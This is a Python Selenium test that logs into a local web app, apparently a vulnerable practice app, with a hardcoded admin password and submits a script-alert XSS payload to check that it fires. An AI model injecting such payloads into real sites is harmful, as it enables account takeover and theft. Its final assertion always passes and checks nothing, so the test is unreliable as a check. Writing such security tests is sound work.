import unittest, os
from selenium import webdriver
from selenium.webdriver.common.by import By

class TestCase(unittest.TestCase):

    @classmethod
    def setUpClass(self):
        option = webdriver.FirefoxOptions()
        option.add_argument('--headless')
        self.browser = webdriver.Firefox(options=option)
        try:
            self.url = os.environ['URL']
        except:
            self.url = "http://localhost"
        
    def test(self):
        self.step_1_login()
        self.step_2_go_to_xss_menu()
        self.step_3_inject_script_and_check()

    def step_1_login(self):
        self.browser.get(self.url + "/login.php")

        username_input = self.browser.find_element(By.ID, "inputUsername")
        password_input = self.browser.find_element(By.ID, "inputPassword")
        username_input.send_keys("admin")
        password_input.send_keys("nimda666!")

        self.browser.find_element(By.TAG_NAME, "button").click()

    def step_2_go_to_xss_menu(self):
        self.browser.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/div/a[2]").click()

    def step_3_inject_script_and_check(self):
        self.browser.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/form/p/input").send_keys("<script>alert('XSSFadel')</script>")
        self.browser.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/form/input").click()
        actual_result = self.browser.switch_to.alert.text
        expected_result = "XSSFadel"
        self.assertTrue(expected_result, actual_result)

    @classmethod
    def tearDownClass(self):
        self.browser.quit()

if __name__ == '__main__':
    unittest.main(verbosity=2,warnings='ignore') 